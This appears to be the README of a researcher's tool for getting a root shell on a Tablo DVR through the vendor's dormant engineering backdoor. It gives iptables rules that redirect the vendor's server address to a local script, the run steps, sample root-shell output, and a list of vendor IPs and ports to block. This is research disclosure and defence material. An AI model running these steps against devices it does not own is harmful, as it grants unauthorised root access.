# Tablo RRS Hijack

An easy way to get root into your Tablo DVR using Hairpin NAT on your network.

In research of the Tablo DVR, it was found that a default-disabled root backdoor existed for engineers. Thankfully it doesn't run by default, but it can be enabled by Tablo at any time. In good news for researchers, which we can "hijack" this to gain a root shell on the device without the need for the root password!

You can find my writeup on this device, and a few others, on my personal blog at https://snt.sh/

## Prereqs

For this to work, you need to setup a hairpin NAT on your network for `3.93.161.222:5012`. Below is an example of what this looks like for linux based routers, but your implementation may vary:

    iptables -t nat -A PREROUTING -d 3.93.161.222 -p tcp --dport 5012 -j DNAT --to IPOFHOSTRUNNINGTHESCRIPT:5012
    iptables -t nat -A POSTROUTING -s YOURLOCALSUBNET/24 -d IPOFHOSTRUNNINGTHESCRIPT -p tcp --dport 5012 -j MASQUERADE

Remember to change out IPOFHOSTRUNNINGTHESCRIPT and YOURLOCALSUBNET with your values! This ONLY WORKS if you setup hairpin NAT correctly!!!

## Usage

To use this root script, please follow the Prereqs and then do the following:

1. Install the requirements.txt
    ```
    pip3 install -r ./requirements.txt
    ```

2. Start up the script
    ```
    ./tablo-rrs-hijack.py
    ```

3. On your running Tablo device, press the reset button 3 times fast. After doing so, you should see a new LED blink pattern
4. You should see the Tablo connect to your script you are running, and then provide you with a root shell! If not, double check your Hairpin NAT is working and you entered the correct IP address information.
    ```
    $ ./tablo-rrs-hijack.py
    Starting our Socket Server on 10.XXX.XXX.XXX:5012...
    Tablo at 10.XXX.XXX.XXX connected!
    Payload sent! Starting up shell, please wait for the Tablo to connect...
    Connected to 10.XXX.XXX.XXX:XXXXXX
    # whoami
    whoami
    root
    # 
    ```

## How to block the backdoor

If the fact Tablo has a root backdoor into this device bothers you, then you can block their ability to enable it at a network level. Below are the IPs and ports used by Tablo to enable the rrs binary. Blocking these will prevent it from being able to work correctly.

    3.93.161.222 5012
    72.142.116.106 25001